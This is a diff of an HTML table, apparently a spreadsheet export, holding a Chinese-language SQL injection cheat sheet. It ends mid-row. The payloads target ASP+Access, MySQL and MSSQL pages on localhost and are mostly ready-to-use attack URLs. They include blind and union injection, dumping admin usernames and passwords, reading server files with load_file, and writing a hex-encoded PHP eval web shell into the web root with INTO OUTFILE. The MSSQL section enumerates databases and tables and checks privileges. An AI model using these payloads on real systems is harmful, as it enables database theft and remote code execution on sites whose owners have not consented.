@@ -349,456 +349,456 @@
       
 
       
-        <table border='0' cellpadding='0' cellspacing='0' width='1283' style='border-collapse: 
- collapse;table-layout:fixed;width:962pt'>
- <col class='x71' width='281' style='mso-width-source:userset;width:210.75pt'>
- <col class='x71' width='1002' style='mso-width-source:userset;width:751.5pt'>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r0'>
-<td rowspan='16' height='332' class='x72' width='281' style='height:249.6pt;width:210.75pt;'>ASP+ACCESS注入</td>
-<td class='x73' width='1002' style='width:751.5pt;'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513</td>
+        <table border="0" cellpadding="0" cellspacing="0" width="1283" style="border-collapse: 
+ collapse;table-layout:fixed;width:962pt">
+ <col class="x71" width="281" style="mso-width-source:userset;width:210.75pt">
+ <col class="x71" width="1002" style="mso-width-source:userset;width:751.5pt">
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r0">
+<td rowspan="16" height="332" class="x72" width="281" style="height:249.6pt;width:210.75pt;">ASP+ACCESS注入</td>
+<td class="x73" width="1002" style="width:751.5pt;">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r1'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513'</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r1">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513'</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r2'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=1</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r2">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=1</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r3'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=2</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r3">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=2</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r4'>
-<td class='x74'><a href="http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)" target="_parent"><span style='font-size:10pt;color:#000000;font-weight:400;text-decoration:none;text-line-through:none;font-family:"微软雅黑";'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)</span></a></td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r4">
+<td class="x74"><a href="http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)" target="_parent"><span style="font-size:10pt;color:#000000;font-weight:400;text-decoration:none;text-line-through:none;font-family:"微软雅黑";">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)</span></a></td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r5'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select 列名 from 表名)</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r5">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select 列名 from 表名)</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r6'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;0</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r6">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;0</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r7'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;10</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r7">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;10</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r8'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;20</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r8">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;20</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r9'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)=5</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r9">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)=5</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r10'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,1,1)) from admin)=97</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r10">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,1,1)) from admin)=97</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r11'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,2,1)) from admin)=100</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r11">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,2,1)) from admin)=100</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r12'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,3,1)) from admin)=109</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r12">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,3,1)) from admin)=109</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r13'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,4,1)) from admin)=105</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r13">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,4,1)) from admin)=105</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r14'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,5,1)) from admin)=110</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r14">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,5,1)) from admin)=110</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r15'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(password,1,1)) from admin)=97</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r15">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(password,1,1)) from admin)=97</td>
  </tr>
- <tr height='20' class='x69' style='mso-height-source:userset;height:15.6pt' id='r16'>
-<td height='20' class='x75' style='height:15.6pt;'></td>
-<td class='x76'></td>
+ <tr height="20" class="x69" style="mso-height-source:userset;height:15.6pt" id="r16">
+<td height="20" class="x75" style="height:15.6pt;"></td>
+<td class="x76"></td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r17'>
-<td rowspan='9' height='187' class='x72' style='height:140.4pt;'>ASP+ACCESS联合注入</td>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r17">
+<td rowspan="9" height="187" class="x72" style="height:140.4pt;">ASP+ACCESS联合注入</td>
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r18'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513'</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r18">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513'</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r19'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=1</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r19">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=1</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r20'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=2</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r20">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=2</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r21'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r21">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r22'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select 列名 from 表名)</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r22">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select 列名 from 表名)</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r23'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 order by 22</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r23">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 order by 22</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r24'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r24">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r25'>
-<td class='x73'>http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 union select 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r25">
+<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 union select 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin</td>
  </tr>
- <tr height='20' class='x70' style='mso-height-source:userset;height:15.6pt' id='r26'>
-<td height='20' class='x75' style='height:15.6pt;'></td>
-<td class='x75'></td>
+ <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r26">
+<td height="20" class="x75" style="height:15.6pt;"></td>
+<td class="x75"></td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r27'>
-<td rowspan='30' height='624' class='x72' style='height:468pt;'>MYSQL</td>
-<td class='x73'>http://localhost/mysql.php?id=1</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r27">
+<td rowspan="30" height="624" class="x72" style="height:468pt;">MYSQL</td>
+<td class="x73">http://localhost/mysql.php?id=1</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r28'>
-<td class='x73'>http://localhost/mysql.php?id=1 order by 3</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r28">
+<td class="x73">http://localhost/mysql.php?id=1 order by 3</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r29'>
-<td class='x73'>http://localhost/mysql.php?id=1 union select 1,2,3</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r29">
+<td class="x73">http://localhost/mysql.php?id=1 union select 1,2,3</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r30'>
-<td class='x73'>http://localhost/mysql.php?id=1 union select user(),version(),database()</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r30">
+<td class="x73">http://localhost/mysql.php?id=1 union select user(),version(),database()</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r31'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat(user(),0x2c,database(),0x2c,version()),2,3</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r31">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(user(),0x2c,database(),0x2c,version()),2,3</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r32'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat_ws(0x2c,user(),database(),version()),2,3</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r32">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat_ws(0x2c,user(),database(),version()),2,3</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r33'>
-<td class='x73'>//查库</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r33">
+<td class="x73">//查库</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r34'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_schema)),2,3 from information_schema.columns</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r34">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_schema)),2,3 from information_schema.columns</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r35'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+schema_name)),2,3 from information_schema.SCHEMATA</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r35">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+schema_name)),2,3 from information_schema.SCHEMATA</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r36'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_schema)),2,3 from information_schema.TABLES</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r36">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_schema)),2,3 from information_schema.TABLES</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r37'>
-<td class='x73'>//查表</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r37">
+<td class="x73">//查表</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r38'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_name)),2,3 from information_schema.columns where table_schema= 0x73716c696e6a656374</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r38">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_name)),2,3 from information_schema.columns where table_schema= 0x73716c696e6a656374</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r39'>
-<td class='x73'>//查列</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r39">
+<td class="x73">//查列</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r40'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+column_name)),2,3 from information_schema.columns where table_name= 0x7573657273</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r40">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+column_name)),2,3 from information_schema.columns where table_name= 0x7573657273</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r41'>
-<td class='x73'>//查内容</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r41">
+<td class="x73">//查内容</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r42'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select id,username,password from users</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r42">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select id,username,password from users</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r43'>
-<td class='x73'>//查询FILE_PRIV权限</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r43">
+<td class="x73">//查询FILE_PRIV权限</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r44'>
-<td class='x73'>select HOST,USER,FILE_PRIV from mysql.user;</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r44">
+<td class="x73">select HOST,USER,FILE_PRIV from mysql.user;</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r45'>
-<td class='x73'>//设置FILE_PRIV权限（语句执行完成需重启mysql服务生效）</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r45">
+<td class="x73">//设置FILE_PRIV权限（语句执行完成需重启mysql服务生效）</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r46'>
-<td class='x73'>UPDATE mysql.user SET File_priv = 'Y';</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r46">
+<td class="x73">UPDATE mysql.user SET File_priv = 'Y';</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r47'>
-<td class='x73'>FLUSH PRIVILEGES;</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r47">
+<td class="x73">FLUSH PRIVILEGES;</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r48'>
-<td class='x73'>//读取文件</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r48">
+<td class="x73">//读取文件</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r49'>
-<td class='x73'>select load_file('C:\\boot.ini');</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r49">
+<td class="x73">select load_file('C:\\boot.ini');</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r50'>
-<td class='x73'>select load_file(0xhex);</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r50">
+<td class="x73">select load_file(0xhex);</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r51'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file('C:\\boot.ini');</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r51">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file('C:\\boot.ini');</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r52'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file(0xhex);</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r52">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file(0xhex);</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r53'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file(0x433A5C5C70687053747564795C5C5757575C5C73716C696E6A6563745C5C66616E322E706870);</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r53">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,load_file(0x433A5C5C70687053747564795C5C5757575C5C73716C696E6A6563745C5C66616E322E706870);</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r54'>
-<td class='x73'>//写入文件</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r54">
+<td class="x73">//写入文件</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r55'>
-<td class='x73'>select 0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E into outfile 'C:\\phpStudy\\WWW\\caidao.php';</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r55">
+<td class="x73">select 0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E into outfile 'C:\\phpStudy\\WWW\\caidao.php';</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r56'>
-<td class='x73'>http://localhost/mysql.php?id=1 and 1=2 union select 1,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E into outfile 'C:\\phpStudy\\WWW\\www.secdic.com.php';</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r56">
+<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select 1,2,0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E into outfile 'C:\\phpStudy\\WWW\\www.secdic.com.php';</td>
  </tr>
- <tr height='20' class='x70' style='mso-height-source:userset;height:15.6pt' id='r57'>
-<td height='20' class='x75' style='height:15.6pt;'></td>
-<td class='x75'></td>
+ <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r57">
+<td height="20" class="x75" style="height:15.6pt;"></td>
+<td class="x75"></td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r58'>
-<td rowspan='42' height='873' class='x72' style='height:655.200000000001pt;'>ASP+MSSQL注入</td>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and user&gt;0</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r58">
+<td rowspan="42" height="873" class="x72" style="height:655.200000000001pt;">ASP+MSSQL注入</td>
+<td class="x73">http://localhost:83/looknews.asp?id=20 and user&gt;0</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r59'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select count(*) from sysobjects)&gt;0</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r59">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select count(*) from sysobjects)&gt;0</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r60'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20;declare @a int—</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r60">
+<td class="x73">http://localhost:83/looknews.asp?id=20;declare @a int—</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r61'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select @@version)&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r61">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select @@version)&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r62'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(select @@VERSION);--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r62">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select @@VERSION);--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r63'>
-<td class='x73'>判断当前数据库：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r63">
+<td class="x73">判断当前数据库：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r64'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and db_name()&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r64">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and db_name()&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r65'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(select db_name());--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r65">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select db_name());--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r66'>
-<td class='x73'>获取机器名：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r66">
+<td class="x73">获取机器名：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r67'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(select @@servername);--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r67">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select @@servername);--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r68'>
-<td class='x73'>判断是否为sa权限：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r68">
+<td class="x73">判断是否为sa权限：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r69'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(select is_member('db_owner'));--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r69">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select is_member('db_owner'));--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r70'>
-<td class='x73'>判断是否有master库读取权限：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r70">
+<td class="x73">判断是否有master库读取权限：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r71'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20and 1= (select HAS_DBACCESS('master'));--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r71">
+<td class="x73">http://localhost:83/looknews.asp?id=20and 1= (select HAS_DBACCESS('master'));--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r72'>
-<td class='x73'>暴库：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r72">
+<td class="x73">暴库：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r73'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(select name from master.dbo.sysdatabases where dbid=1);--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r73">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select name from master.dbo.sysdatabases where dbid=1);--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r74'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(select name from master.dbo.sysdatabases where dbid=2);--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r74">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(select name from master.dbo.sysdatabases where dbid=2);--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r75'>
-<td class='x73'>暴表：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r75">
+<td class="x73">暴表：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r76'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 )&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r76">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 )&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r77'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass'))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r77">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass'))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r78'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin'))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r78">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin'))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r79'>
